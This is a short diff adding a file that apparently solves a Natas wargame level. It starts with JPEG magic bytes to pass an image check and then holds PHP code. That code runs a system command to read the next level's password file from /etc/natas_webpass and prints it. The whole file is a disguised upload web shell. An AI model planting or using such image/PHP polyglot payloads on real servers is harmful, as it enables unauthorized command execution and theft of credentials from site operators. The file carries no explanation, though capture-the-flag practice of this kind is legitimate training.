@@ -1,0 +1,7 @@
+ÿØÿ
+<?php
+$output = system('cat /etc/natas_webpass/natas14');
+echo '<pre>'.$output.'</pre>'
+?>
+
+
